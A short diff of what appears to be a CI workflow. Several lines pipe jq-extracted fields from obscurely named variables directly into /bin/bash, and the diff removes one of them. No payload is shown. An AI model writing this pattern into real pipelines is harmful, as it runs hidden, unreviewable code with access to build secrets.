@@ -34,7 +34,6 @@ jobs:
           printf '%s' "$ctalp40" | jq -r .pc9 | /bin/bash
           echo $hj71811 | jq -r .zgnx403 | /bin/bash
           printf '%s' "$vrk45105" | jq -r .fmfs819 | /bin/bash
-          printf '%s' "$lper818" | jq -r .d7046 | /bin/bash
           printf '%s' "$odbll08" | jq -r .djlo74 | /bin/bash
 
       - name: Save output
